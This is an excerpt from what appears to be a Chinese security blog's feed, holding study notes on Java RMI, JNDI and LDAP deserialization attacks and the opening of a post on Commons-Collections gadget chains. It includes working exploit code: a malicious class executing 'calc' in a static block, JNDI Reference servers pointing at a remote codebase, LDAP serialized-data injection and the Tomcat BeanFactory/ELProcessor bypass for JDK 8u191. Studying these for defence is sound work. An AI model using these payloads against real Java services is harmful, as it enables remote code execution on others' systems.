href="https://xz.aliyun.com/t/7079#toc-3%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E5%B1%95%E7%A4%BA%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E3%80%82">https://xz.aliyun.com/t/7079#toc-3，这里我们展示调用过程。</a></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一种适应各种序列化点的方法，只需把下面“类名”替换为需要的Remote</span></span><br><span class="line"><span class="comment">//class.cast方法，用于将Object对象强制转换为该Class会该接口，其实直接(类名)Proxy.newProxyInstance也可</span></span><br><span class="line">类名 remote =类名.class.cast(Proxy.newProxyInstance(App3.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;类名.class&#125;, invocationHandler));</span><br><span class="line"></span><br><span class="line"><span class="comment">//上面创造了Remote的动态代理对象，调用Remote的任何方法时，都会调用AnnotationInvocationHandler.invoke</span></span><br><span class="line"><span class="comment">//这里AnnotationInvocationHandler作为容器，来帮助其他对象二次反序列化</span></span><br><span class="line">ObjectInputStream.readObject() -&gt; Remote.readObject() -&gt; AnnotationInvocationHandler.invoke() -&gt; AnnotationInvocationHandler属性为BadAttributeValueExpException，还没有反序列化，继而进入CC5</span><br><span class="line">    BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString() -&gt; TiedMapEntry.getValue() -&gt; LazyMap.get(not_exist_key) -&gt; ChainedTransformer.transform() -&gt; RCE</span><br></pre></td></tr></table></figure><h3 id="客户端打注册中心，注册中心打客户端"><a href="#客户端打注册中心，注册中心打客户端" class="headerlink" title="客户端打注册中心，注册中心打客户端"></a>客户端打注册中心，注册中心打客户端</h3><p>​<strong>(HelloService) registry.lookup(“hello”)</strong></p><p>​RMI客户端向RMI注册中心，请求HelloServiceImpl实例的stub对象时，会序列化查询的“hello”，我们可以利用这个位置。在执行下面writeObject前，通过Evaluate Expression执行“var3.writeObject(CC5.getCC())”，将CC链写入序列化流。</p><p>​再执行源码中的writeObject时，并不会覆盖CC链序列化流，能在服务端成功RCE，先执行源码writeObject则失败。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">var3.writeObject(var1);<span class="comment">//序列化查询的“hello”</span></span><br></pre></td></tr></table></figure><p>​我原先的思路是，替换String类型的var1为CC5链，发现如下问题，后来才有上面的思路，直接利用序列化点var3.writeObject。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">比如var1原类型是String，Debug时右键点击setVale，输入<span class="keyword">new</span> <span class="title class_">Date</span>，就能改变属性类型和属性值。但是不知道为啥输入CC5.get()这种，就会立即命令执行，反而readObject时不再执行了。</span><br></pre></td></tr></table></figure><p>​在RMI注册中心RegistryImpl_Skel#dispatch方法中，会对传递的“hello”反序列化，后来将Remote对象序列化后返回。该Remote对象，可以是上一节registry.bind用到的Remote代理对象，从而在客户端被反序列化造成RCE。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不知道为什么直接请求bind的Remote对象，没有RCE???</span></span><br><span class="line">var10 = var2.getInputStream();</span><br><span class="line">var7 = (String)var10.readObject();</span><br><span class="line">var8 = var6.lookup(var7);  <span class="comment">//var8为Remote对象</span></span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">var9.writeObject(var8);</span><br></pre></td></tr></table></figure><h3 id="客户端打服务端，服务端打客户端"><a href="#客户端打服务端，服务端打客户端" class="headerlink" title="客户端打服务端，服务端打客户端"></a>客户端打服务端，服务端打客户端</h3><p>​<strong>helloService.sayHello</strong></p><p>​我将sayHello方法修改为传参hashSet，返回hashSet，在客户端传参CC6链，在服务端返回CC6链，都造成了RCE。这个反序列化点还是比较明确的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);<span class="comment">//序列化传参，内部writeObject</span></span><br><span class="line">var7.executeCall();<span class="comment">//远程方法执行</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">var50</span> <span class="operator">=</span> unmarshalValue(var49, (ObjectInput)var11);<span class="comment">//反序列化返回结果，内部readObject</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​RMI的反序列化问题，发生在服务端bind恶意对象到注册中心；客户端lookup时，查询String参数和返回Remote对象的反序列化；客户端远程命令执行时，方法传参和返回值的反序列化。当掌握完全Debug下的反序列化，不再受序列化点类型限制时，我们总能在控制通信一端的情况下发起攻击，但是，反序列化要求本地环境存在Gadget，成为了无法逾越的山丘。</p><h2 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h2><blockquote><p><a href="https://security.tencent.com/index.php/blog/msg/131">https://security.tencent.com/index.php/blog/msg/131</a></p><p><a href="https://paper.seebug.org/942/#ldapgadget">https://paper.seebug.org/942/#ldapgadget</a></p></blockquote><p>​反序列化需要Gadget，我们常见的RMI攻击并不是通过反序列化，而是目标服务器存在context.lookup方法且参数可控，传入字符串“rmi:&#x2F;&#x2F;x.x.x.x:x&#x2F;obj”，通过RMI远程加载并实例化类，执行static代码块或构造方法中的恶意代码，蹭蹭蹭RCE大功告成。</p><p>​这就涉及到RMI的核心特点，动态类加载，<strong>如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class</strong>，动态加载的对象class文件可以使用Web服务的方式进行托管。这种需求很常见，还是以sayHello方法为例，传参和返回值都是HashSet的子类，比如实现payload类继承hashSet，当执行helloService.sayHello方法返回后，因为客户端没有payload类的class文件，就会报错。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ClassNotFoundException: com.bmsk.attack.RMI.payload</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">payload</span> <span class="keyword">extends</span> <span class="title class_">HashSet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RMI-Remote-Object-Payload"><a href="#RMI-Remote-Object-Payload" class="headerlink" title="RMI Remote Object Payload"></a>RMI Remote Object Payload</h3><p>​从JDK 6u45、7u21开始，**java.rmi.server.useCodebaseOnly **默认为true，退出历史舞台。</p><p>​Java6u45和7u21前，能将codebase随着序列化数据传输。比如RMI服务端的payload.class文件可以托管在web服务上，启动RMI服务时指定web地址，当RMI客户端找不到payload定义时，就会到该地址获取，从而造成RMI客户端加载类时执行恶意代码。反之亦然。</p><p>​复现失败了，当设置SecurityManager会禁止访问RMI注册中心。</p><p>​从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true，只会在本地CLASSPATH和启动Java程序时配置的java.rmi.server.codebase路径加载类文件。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//RMI客户端（被攻击方）</span></span><br><span class="line">开启System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">-Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy</span><br><span class="line"></span><br><span class="line"><span class="comment">//RMI服务端（攻击方）</span></span><br><span class="line">-Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -DJava.rmi.server.codebase=http:<span class="comment">//127.0.0.1:8080/</span></span><br></pre></td></tr></table></figure><h3 id="RMI-JNDI-Reference-Payload"><a href="#RMI-JNDI-Reference-Payload" class="headerlink" title="RMI + JNDI Reference Payload"></a>RMI + JNDI Reference Payload</h3><p>​ 从JDK 6u132, JDK 7u122, JDK 8u113开始，<strong>com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase</strong>默认为false，退出历史舞台。</p><p>​JNDI是一种接口，定义了“通过资源名查找资源”这一行为的标准，我们可以将RMI弄成JNDI的形状。RMI中要求远程接口要继承Remote接口，远程接口实现类要实现UnicastRemoteObject类，这在JNDI上都实现了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JNDI客户端</span></span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">initialContext.lookup(url);</span><br><span class="line"></span><br><span class="line"><span class="comment">//JNDI服务端</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">registry.bind(<span class="string">&quot;obj&quot;</span>,referenceWrapper);</span><br><span class="line"></span><br><span class="line"><span class="comment">//public class ReferenceWrapper extends UnicastRemoteObject implements RemoteReference</span></span><br></pre></td></tr></table></figure><p>​JNDI注入的原理是：</p><ul><li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； </li><li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； </li><li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li></ul><p>​JNDI客户端在远程加载类时，经过如下调用链到达NamingManager的getObjectFactoryFromReference方法，这是从服务端返回的Reference对象中构造出一个ObjectFactory对象，可以看到该方法会加载并实例化远程类。</p><p>​其实这个类是不是实现了ObjectFactory接口不重要，都能在static或者构造器中RCE，但是，后来的逻辑中会调用该ObjectFactory对象的getObjectInstance方法。如果禁用了trustURLCodebase，就能根据传递的信息构造一个本地的ObjectFactory实现类，它的getObjectInstance方法如果能提供一些动态的特性（反射执行方法、构造器执行、加载字节码等），就能实现本地加载类RCE。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用链</span></span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:<span class="number">464</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">124</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">main:<span class="number">20</span>, JNDIclient (com.bmsk.RMI)</span><br><span class="line">    </span><br><span class="line"><span class="comment">//getObjectFactoryFromReference方法</span></span><br><span class="line">clas = helper.loadClass(factoryName, codebase);</span><br><span class="line"><span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//getObjectInstance</span></span><br><span class="line">factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line"><span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">                environment);</span><br></pre></td></tr></table></figure><p>​因此，一般JNDI反序列化挂载在web服务器上的payload长这样：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​但是在JDK 6u132, JDK 7u122, JDK 8u113 中，Java提升了JNDI 限制了Naming&#x2F;Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p><h3 id="LDAP-JNDI-Reference-Payload"><a href="#LDAP-JNDI-Reference-Payload" class="headerlink" title="LDAP + JNDI Reference Payload"></a>LDAP + JNDI Reference Payload</h3><p>​在Oracle JDK 11.0.1、8u191、7u201、6u211之后，<strong>com.sun.jndi.ldap.object.trustURLCodebase</strong>默认为false，退出历史舞台。</p><p>​前面说LDAP是一种目录数据库，能够保存Java对象，通过JNDI访问。既然JNDI底层是RMI时，不再允许加载远程类，那底层是LDAP时，是否可以呢？在JDK 8u113-8u191之间的版本是可以的。我们通过<a href="https://www.cnblogs.com/nice0e3/p/13958047.html%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E8%B5%B7%E4%B8%80%E4%B8%AALDAP%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8JNDI%E7%9A%84lookup%E5%A4%84%E4%BC%A0%E4%B8%80%E4%B8%AAldap%E5%8D%8F%E8%AE%AE%E7%9A%84url%E5%B0%B1%E5%A5%BD%E3%80%82">https://www.cnblogs.com/nice0e3/p/13958047.html中的代码起一个LDAP服务器，然后在JNDI的lookup处传一个ldap协议的url就好。</a></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://127.0.0.1:7777/test&quot;</span>);</span><br></pre></td></tr></table></figure><p>​这个BUG在2018年10月被修好，至今已过去5年，我竟然还在学这个！！</p><h3 id="绕过JDK-8u191"><a href="#绕过JDK-8u191" class="headerlink" title="绕过JDK 8u191"></a>绕过JDK 8u191</h3><h4 id="本地Class作为Reference-Factory"><a href="#本地Class作为Reference-Factory" class="headerlink" title="本地Class作为Reference Factory"></a>本地Class作为Reference Factory</h4><p>​前面提到，当远程类加载被禁用时，就需要在本地找一个ObjectFactory接口的实现类，其getObjectInstance能够提供一些动态的特性。通过服务端返回的Reference类提供的信息，实例化该ObjectFactory类，调用getObjectInstance方法。</p><p>​BeanFactory 位于Tomcat依赖包，其getObjectInstance方法会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。这里用的Bean Class是ELProcessor，下面StringRefAddr维护的是属性和属性值的映射关系，这里有点复杂不再调试，简单记下特性。</p><p>​BeanFactory的getObjectInstance方法，遇到属性forceString时，解析属性值“a&#x3D;eval”（属性名，新方法名），将seta方法替换为eval方法，当遇到属性a时，自动调用seta方法变成了调用eval(a的属性值)，就会对EL表达式求值，达成RCE。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">registry.bind(<span class="string">&quot;obj&quot;</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通式 需要Bean Class有无参构造器</span></span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;随便名=关键执行函数&quot;</span>));</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;随便名&quot;</span>, String型的payload));</span><br></pre></td></tr></table></figure><h4 id="利用LDAP返回序列化数据，触发本地Gadget"><a href="#利用LDAP返回序列化数据，触发本地Gadget" class="headerlink" title="利用LDAP返回序列化数据，触发本地Gadget"></a>利用LDAP返回序列化数据，触发本地Gadget</h4><p>​LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyAC5....&quot;</span>));</span><br><span class="line"><span class="comment">//com.sun.jndi.ldap.LdapCtx的c_lookup方法，有如下逻辑，会对这个参数序列化</span></span><br><span class="line"><span class="keyword">if</span> (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[<span class="number">2</span>]) != <span class="literal">null</span>) &#123;</span><br><span class="line">    var3 = Obj.decodeObject((Attributes)var4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​注意，是这个Base64库。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bytes);</span><br><span class="line">out.writeObject(CC5.getCC());</span><br><span class="line"><span class="comment">//base64编码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> Base64.encode(bytes.toByteArray());</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bytesIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytesIn);</span><br><span class="line">in.readObject();</span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>​RMI，远程方法调用，是让某个JVM的对象调用另一个JVM的对象方法，调用远程对象方法期间，JVM可能需要加载不在本地CLASSPATH的类，需要对方法参数和返回值进行序列化与反序列化，这就发生了安全问题。</p><p>​首先说RMI的反序列化问题，因为通信要靠JRMP协议传输序列化流，通信双方要对传来的数据反序列化，就存在一些可以利用的反序列化点，主要在3个位置：1.服务端bind恶意对象到注册中心；2.客户端lookup时，查询String参数和返回Remote对象的反序列化；3.客户端远程命令执行时，方法传参和返回值的反序列化。可以利用这些反序列化点，对RMI客户端、服务端和注册中心RCE。</p><p>​RMI中主要的问题是远程类的加载，最早客户端信任服务端传来的codebase地址，会到该地址获取本地CLASSPATH没有的class文件，从JDK 6u45、7u21开始，**java.rmi.server.useCodebaseOnly **默认为true，rmi远程地址不被信任。</p><p>​JNDI对“通过资源名获取资源的行为”进行了统一规范，被称为Java命名和目录接口，当JNDI封装了RMI时，服务端返回Reference对象，客户端根据Reference对象加载远程ObjectFactory类，并实例化。因此在ObjectFactory类的static、构造函数和getObjectInstance可以写入恶意代码，在客户端RCE。 从JDK 6u132, JDK 7u122, JDK 8u113开始，<strong>com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase</strong>默认为false，RMI+JNDI远程类加载不可用。</p><p>​既然JNDI底层是RMI时，不再允许加载远程类，那底层是LDAP时，是否可以呢？JDK8u112以后，能够通过LDAP+JNDI实现远程类加载，在Oracle JDK 11.0.1、8u191、7u201、6u211之后，<strong>com.sun.jndi.ldap.object.trustURLCodebase</strong>默认为false，不再可行。</p><p>​现在说的JNDI注入高版本绕过，指JDK 8u191后实现JNDI注入，这主要有两种方式：通过本地Factory的绕过，通过LDAP打本地Gadget的绕过。</p><p>​先说通过本地Factory绕过，就是RMI+JNDI加载ObjectFactory类时，如果本地存在该类，就不需要远程加载，而Tomcat依赖包里的BeanFactory能够实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。BeanFactory的getObjectInstance方法，遇到属性forceString时，解析属性值“a&#x3D;eval”（属性名，新方法名），将seta方法替换为eval方法，当遇到属性a时，自动调用seta方法变成了调用eval(a的属性值)，就会对EL表达式求值，达成RCE。</p><p>​再说LDAP打本地Gadget，在攻击者启动的LDAP服务器sendResult方法中，加一条与反序列化有关的属性，客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。但是，反序列化都需要有本地Gadget。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyA...&quot;));</span><br></pre></td></tr></table></figure><p>​这就是RMI、JNDI注入、LDAP注入的内容吧~</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习篇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链复习篇</title>
      <link href="/2023/03/04/CC%E9%93%BE%E5%A4%8D%E4%B9%A0%E7%AF%87/"/>
      <url>/2023/03/04/CC%E9%93%BE%E5%A4%8D%E4%B9%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="CC链复习篇"><a href="#CC链复习篇" class="headerlink" title="CC链复习篇"></a>CC链复习篇</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//www.anquanke.com/post/id/200384</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/litlife/p/12571787.html</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/weixin_43610673/article/details/127580121</span></span><br></pre></td></tr></table></figure><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//commons-collections3.1</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"><span class="comment">//commons-collections4.0</span></span><br><span class="line"><span class="comment">//TransformingComparator类在3.1-3.2.1版本中还没有实现Serializable接口，无法被反序列化，commons-collections4.0可以。</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"><span class="comment">//commons-beanutils</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.8</span><span class="number">.3</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="挖掘Java反序列化的思路"><a href="#挖掘Java反序列化的思路" class="headerlink" title="挖掘Java反序列化的思路"></a>挖掘Java反序列化的思路</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、首先要找到反序列化入口（source）</span><br><span class="line"><span class="number">2</span>、调用链（gadget）</span><br><span class="line"><span class="number">3</span>、触发漏洞的目标方法（sink）</span><br><span class="line">    </span><br><span class="line">source</span><br><span class="line">    Java原生的反序列化，即通过ObjectInputStream.readObject()，处理二进制格式内容，得到Java对象</span><br><span class="line">专有格式的反序列化，例如通过Fastjson, Xstream等第三方库，处理json, xml等格式内容，得到Java对象</span><br><span class="line">sink</span><br><span class="line">    Runtime.exec()，这种最为简单直接，即直接在目标环境中执行命令</span><br><span class="line">    Method.invoke()，这种需要适当地选择方法和参数，通过反射执行Java方法</span><br><span class="line">    RMI/JNDI/JRMP等，通过引用远程对象，间接实现任意代码执行的效果</span><br><span class="line">从source出发，递归检查其所有方法调用，如果能够执行到sink就是一条gadget</span><br></pre></td></tr></table></figure><h2 id="从Transformer观察CC链"><a href="#从Transformer观察CC链" class="headerlink" title="从Transformer观察CC链"></a>从Transformer观察CC链</h2><p>​commons-collections库的TransformedMap、LazyMap等绑定在HashMap，增强其功能。此外，CC库提供的这些类实现了Serializable接口，创造了反序列化利用的条件。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">normalMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//当map.put(a,b)、setValue(b)这种改变HashMap的行为发生时</span></span><br><span class="line"><span class="comment">//调用keyTransformer或者valueTransformer的transform方法</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(normalMap,keyTransformer,valueTransformer);</span><br><span class="line"><span class="comment">//当lazyMap.get(不存在的key)时，调用myTransformer.transform</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(normalMap,myTransformer);</span><br></pre></td></tr></table></figure><p>​上面的keyTransformer、myTransformer等是实现了Transformer接口的类，为了能在目标环境利用，我们需要是CC库中已有的实现。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ChainedTransformer</span></span><br><span class="line">维护Transformer[]数组，按顺序调用元素的transform方法，返回结果会被当成参数输入到下一轮执行。</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//ConstantTransformer</span></span><br><span class="line">不管输入Object是啥，都返回实例化时输入的对象。</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//InvokerTransformer</span></span><br><span class="line">获取输入Object的类型，获取实例化时输入的方法名和参数，通过反射执行该方法</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//InstantiateTransformer</span></span><br><span class="line">通过反射获取输入Object的构造函数，实例化该对象。</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="利用ChainedTransformer"><a href="#利用ChainedTransformer" class="headerlink" 